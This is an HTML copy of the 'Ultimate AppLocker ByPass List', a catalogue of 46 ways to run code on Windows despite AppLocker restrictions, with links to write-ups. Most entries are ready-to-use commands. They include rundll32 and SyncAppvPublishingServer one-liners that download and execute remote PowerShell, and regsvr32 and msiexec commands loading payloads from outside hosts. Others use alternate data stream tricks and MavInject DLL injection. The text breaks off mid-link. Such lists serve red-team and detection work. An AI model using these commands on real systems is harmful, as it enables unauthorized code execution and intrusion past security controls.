<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Applocker Bypass list</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">Applocker Bypass list</h1><br/><h1>Ultimate AppLocker ByPass List</h1><br />The goal of this repository is to document the most common techniques to bypass AppLocker. This README file contains a complete list of all known bypasses. Since AppLocker can be configured in different ways it makes sense to have master list of bypasses. This README.MD will be the master and will be updated with known and possible AppLocker bypasses.<br />I have created a list of verified bypasses that works against the default rules created with AppLocker.<br />For details on how I verified and how to create the default rules you can check my blog: <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><a href="https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedBypasses-DefaultRules.md">VerifiedBypasses-DefaultRules.MD</a><br />Please contribute and do point out errors or resources I have forgotten.<br /><br /><h2>1. Rundll32.exe</h2><br /><code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"<br /><br />rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");<br /><br />rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}<br /><br />rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")<br /><br />rundll32 shell32.dll,Control_RunDLL payload.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes: I only tested on Windows 10 against the default rules, it could work against older Windows versions.<br />• Links:• <a href="https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/">https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/</a><br />• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Rundll32.md</a><br />• <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><br /><br /><h2>2. Regsvr32.exe</h2><br /><code>regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes: I only tested on Windows 10 against the default rules, it could work against older Windows versions.<br />• Links:• <a href="https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302">https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Regsvr32.md</a><br /><br /><br /><h2>3. Msbuild.exe</h2><br /><code>msbuild.exe pshell.xml<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614">https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614</a><br />• <a href="http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html">http://subt0x10.blogspot.no/2017/04/bypassing-application-whitelisting.html</a><br />• <a href="https://github.com/Cn33liz/MSBuildShell">https://github.com/Cn33liz/MSBuildShell</a><br />• <a href="https://github.com/Cn33liz/MS17-012">https://github.com/Cn33liz/MS17-012</a><br />• <a href="https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/">https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/</a><br />• <a href="https://www.youtube.com/watch?v=aSDEAPXaz28">https://www.youtube.com/watch?v=aSDEAPXaz28</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/Trusted_Developer_Utilities.md</a><br />• <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><br /><br /><h2>4. Regsvcs.exe</h2><br /><code>regsvcs.exe /U regsvcs.dll<br /><br />regsvcs.exe regsvcs.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a><br />• <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><br /><br /><h2>5. Regasm.exe</h2><br /><code>regasm.exe /U regsvcs.dll<br /><br />regasm.exe regsvcs.dll<br /></code>• Requires admin: /U does not require admin<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/">https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Payloads/RegSvcsRegAsmBypass.cs</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/RegsvcsRegasm.md</a><br />• <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><br /><br /><h2>6. Bginfo.exe</h2><br /><code>bginfo.exe bginfo.bgi /popup /nolicprompt<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: No<br />Notes: Will work if BGinfo.exe is located in a path that is trusted by the policy.<br />• Links:• <a href="https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/">https://oddvar.moe/2017/05/18/bypassing-application-whitelisting-with-bginfo/</a><br />• <a href="https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/">https://oddvar.moe/2017/05/22/clarification-bginfo-4-22-applocker-still-vulnerable/</a><br />• <a href="https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/">https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/</a><br /><br /><br /><h2>7. InstallUtil.exe</h2><br /><code>InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://github.com/subTee/AllTheThings">https://github.com/subTee/AllTheThings</a><br />• <a href="https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/">https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/</a><br />• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12</a><br />• <a href="http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html">http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html</a><br />• <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md">https://github.com/redcanaryco/atomic-red-team/blob/master/Windows/Execution/InstallUtil.md</a><br />• <a href="https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/">https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/</a><br />• <a href="https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/">https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/</a><br /><br /><br /><h2>8. MSDT.exe</h2><br /><code>Open .diagcab package<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/">https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>9. mshta.exe</h2><br /><code>mshta.exe evilfile.hta<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>10. Execute .Bat</h2><br /><code>cmd.exe /k &lt; script.txt<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes:<br />• Links:• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>11. Execute .PS1</h2><br /><code>Get-Content script.txt | iex<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes:<br />• Links:• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>12. Execute .VBS</h2><br /><code>cscript.exe //E:vbscript script.txt<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: No<br />Notes:<br />• Links:• <a href="https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3">https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>13. PresentationHost.exe</h2><br /><code>Missing Example<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf">https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf</a><br />• <a href="https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/">https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/</a><br /><br /><br /><h2>14. dfsvc.exe</h2><br /><code>Missing Example<br /></code>• Requires admin: ?<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf">https://github.com/api0cradle/ShmooCon-2015/blob/master/ShmooCon-2015-Simple-WLEvasion.pdf</a><br /><br /><br /><h2>15. IEExec.exe</h2><br /><code>ieexec.exe http://x.x.x.x:8080/bypass.exe<br /></code>• Requires admin: ?<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/">https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/</a><br /><br /><br /><h2>16. cdb.exe</h2><br /><code>cdb.exe -cf x64_calc.wds -o notepad.exe<br /></code>• Requires admin: ?<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html">http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html</a><br /><br /><br /><h2>17. dnx.exe</h2><br /><code>dnx.exe consoleapp<br /></code>• Requires admin: ?<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/">https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/</a><br /><br /><br /><h2>18. rcsi.exe</h2><br /><code>rcsi.exe bypass.csx<br /></code>• Requires admin: ?<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/">https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/</a><br /><br /><br /><h2>19. csi.exe</h2><br /><code>Missing example<br /></code>• Requires admin: ?<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://web.archive.org/web/20161008143428/">https://web.archive.org/web/20161008143428/</a><br />• <a href="http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html">http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html</a><br /><br /><br /><h2>20. CPL loading location manipulation</h2><br /><code>Control.exe<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/">https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/</a><br />• <a href="https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/">https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulation/</a><br /><br /><br /><h2>21. msxsl.exe</h2><br /><code>msxsl.exe customers.xml script.xsl<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/">https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/</a><br />• <a href="https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1">https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1</a><br />• <a href="https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker">https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker</a><br />• <a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/">https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/</a><br /><br /><br /><h2>22. msiexec.exe</h2><br /><code>msiexec /quiet /i cmd.msi<br /><br />msiexec /q /i http://192.168.100.3/tmp/cmd.png<br /></code>• Requires admin: ?<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/">https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/</a><br /><br /><br /><h2>23. cmstp.exe</h2><br /><code>cmstp.exe /ni /s c:\cmstp\CorpVPN.inf<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Can also execute scriptlets - <a href="https://twitter.com/NickTyrer/status/958450014111633408">https://twitter.com/NickTyrer/status/958450014111633408</a><br /> <a href="https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80">https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80</a><br />• Links:• <a href="https://msitpros.com/?p=3960">https://msitpros.com/?p=3960</a><br />• <a href="https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e">https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e</a><br /><br /><br /><h2>24. xwizard.exe</h2><br /><code>xwizard.exe argument1 argument2<br /></code>DLL loading in same folder xwizard.dll<br />• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/">http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/</a><br /><br /><br /><h2>25. fsi.exe</h2><br /><code>fsi.exe c:\folder\d.fscript<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1">https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1</a><br />• <a href="https://twitter.com/NickTyrer/status/904273264385589248">https://twitter.com/NickTyrer/status/904273264385589248</a><br />• <a href="https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/">https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/</a><br /><br /><br /><h2>26. odbcconf.exe</h2><br /><code>odbcconf -f file.rsp<br /></code>• Requires admin: ?<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b">https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b</a><br /><br /><br /><h2>27. te.exe</h2><br /><code>te.exe bypass.wsc<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted. Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF<br />• Links:• <a href="https://twitter.com/gN3mes1s/status/927680266390384640">https://twitter.com/gN3mes1s/status/927680266390384640</a><br />• <a href="https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42">https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42</a><br /><br /><br /><h2>28. Placing files in writeable paths under c:\windows</h2><br />The following folders are by default writable and executable by normal users<br /><code>C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys<br /><br />C:\Windows\System32\spool\drivers\color<br /><br />C:\Windows\Tasks<br /><br />C:\windows\tracing<br /></code>• Requires admin: No<br />• Windows binary: N/A<br />• Bypasses AppLocker Default rules: ?<br />Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions<br /><br /><h2>29. Atbroker.exe</h2><br /><code>ATBroker.exe /start malware<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/">http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/</a><br /><br /><br /><h2>30. WMIC.exe</h2><br /><code>wmic process call create calc<br /><br />wmic process get brief /format:"https://www.example.com/file.xsl<br /><br />wmic os get /format:"MYXSLFILE.xsl"<br /><br />wmic process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory">https://stackoverflow.com/questions/24658745/wmic-how-to-use-process-call-create-with-a-specific-working-directory</a><br />• <a href="https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html">https://subt0x11.blogspot.no/2018/04/wmicexe-whitelisting-bypass-hacking.html</a><br />• <a href="https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl">https://gist.githubusercontent.com/caseysmithrc/68924cabbeca1285d2941298a5b91c24/raw/8574e0c019b17d84028833220ed0b30cf9eea84b/minimalist.xsl</a><br /><br /><br /><h2>31. MavInject32.exe</h2><br /><code>MavInject32.exe &lt;PID&gt; /INJECTRUNNING &lt;PATH DLL&gt;<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://twitter.com/gN3mes1s/status/941315826107510784">https://twitter.com/gN3mes1s/status/941315826107510784</a><br />• <a href="https://twitter.com/Hexacorn/status/776122138063409152">https://twitter.com/Hexacorn/status/776122138063409152</a><br /><br /><br /><h2>32. Pubprn.vbs</h2><br /><code>pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/api0cradle/fb164762143b1ff4042d9c662171a568/raw/709aff66095b7f60e5d6f456a5e42021a95ca802/test.sct<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology">https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology</a><br />• <a href="https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/">https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/</a><br /><br /><br /><h2>33. slmgr.vbs</h2><br /><code>slmgr.vbs<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Requires registry keys for com object.<br />• Links:• <a href="https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology">https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology</a><br />• <a href="https://www.youtube.com/watch?v=3gz1QmiMhss">https://www.youtube.com/watch?v=3gz1QmiMhss</a><br /><br /><br /><h2>34. winrm.vbs</h2><br /><code>winrm quickconfig<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Requires registry keys for com object.<br />• Links:• <a href="https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology">https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology</a><br />• <a href="https://www.youtube.com/watch?v=3gz1QmiMhss">https://www.youtube.com/watch?v=3gz1QmiMhss</a><br /><br /><br /><h2>35. forfiles.exe</h2><br /><code>forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://twitter.com/vector_sec/status/896049052642533376">https://twitter.com/vector_sec/status/896049052642533376</a><br /><br /><br /><h2>36. SyncAppvPublishingServer.exe</h2><br /><code>SyncAppvPublishingServer.exe "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://twitter.com/monoxgas/status/895045566090010624">https://twitter.com/monoxgas/status/895045566090010624</a><br /><br /><br /><h2>37. InfDefaultInstall.exe</h2><br /><code>InfDefaultInstall.exe shady.inf<br /></code>• Requires admin: ?<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Only works on Windows 7? Windows 10 requires admin or digital signature<br />• Links:• <a href="https://twitter.com/KyleHanslovan/status/911997635455852544">https://twitter.com/KyleHanslovan/status/911997635455852544</a><br />• <a href="https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a">https://gist.github.com/KyleHanslovan/5e0f00d331984c1fb5be32c40f3b265a</a><br />• <a href="https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/">https://blog.conscioushacker.io/index.php/2017/10/25/evading-microsofts-autoruns/</a><br /><br /><br /><h2>38. Winword.exe</h2><br /><code>winword.exe /l dllfile.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: No commonly made DLL example file<br />• Links:• <a href="https://twitter.com/subTee/status/884615369511636992">https://twitter.com/subTee/status/884615369511636992</a><br /><br /><br /><h2>39. Runscripthelper.exe</h2><br /><code>runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes:<br />• Links:• <a href="https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc">https://posts.specterops.io/bypassing-application-whitelisting-with-runscripthelper-exe-1906923658fc</a><br /><br /><br /><h2>40. Tracker.exe</h2><br /><code>Tracker.exe /d .\calc.dll /c C:\Windows\write.exe<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes: Part of Visual studio. Requires TrackerUI.dll present in 1028 subfolder.<br />• Links:• <a href="https://twitter.com/Sudhanshu_C/status/943011972261412864">https://twitter.com/Sudhanshu_C/status/943011972261412864</a><br /><br /><br /><h2>41. .WSF files</h2><br /><code>script.wsf<br /></code>• Requires admin: No<br />• Windows binary: No<br />• Bypasses AppLocker Default rules: ?<br />Notes: .WSF files are supposed to not be blocked by AppLocker<br />• Links:<br /><br /><h2>42. PowerShell version 2</h2><br /><code>Powershell -version 2<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Bypasses Constrained language mode<br />• Links:<br /><br /><h2>43. CL_Invocation.ps1</h2><br /><code>. C:\Windows\diagnostics\system\AERO\CL_Invocation.ps1<br /><br />SyncInvoke &lt;executable&gt; [args]<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes, as long as PowerShell version 2 is present<br />Notes: Requires PowerShell version 2<br />• Links:• <a href="https://twitter.com/bohops/status/948548812561436672">https://twitter.com/bohops/status/948548812561436672</a><br /><br /><br /><h2>44. Incorrect permissions on files in folders</h2><br /><code>type C:\temp\evil.exe &gt; "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"<br /><br />wmic process call create '"C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"'<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://twitter.com/Oddvarmoe/status/951757732557852673">https://twitter.com/Oddvarmoe/status/951757732557852673</a><br /><br /><br /><h2>45. Control.exe -Loading DLL/CPL binary from Alternate data stream</h2><br /><code>type notepad_reflective_x64.dll &gt; c:\windows\tasks\zzz:notepad_reflective_x64.dll<br />control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: ?<br />Notes: Requires write access to a place that is allowed by AppLocker<br />• Links:• <a href="https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/">https://bohops.com/2018/01/23/loading-alternate-data-stream-ads-dll-cpl-binaries-to-bypass-applocker/</a><br />• <a href="https://twitter.com/bohops/status/955659561008017409">https://twitter.com/bohops/status/955659561008017409</a><br /><br /><br /><h2>46. Advpack.dll - LaunchINFSection</h2><br /><code>rundll32.exe advpack.dll,LaunchINFSection c:\test.inf,DefaultInstall_SingleUser,1,<br /></code>• Requires admin: No<br />• Windows binary: Yes<br />• Bypasses AppLocker Default rules: Yes<br />Notes:<br />• Links:• <a href="https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/">https://bohops.com/2018/02/26/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence/</a><br />• <a href="https://twitter.com/bohops/status/967486047839014913">https://twitter.com/bohops/status/967486047839014913</a><br />• <a 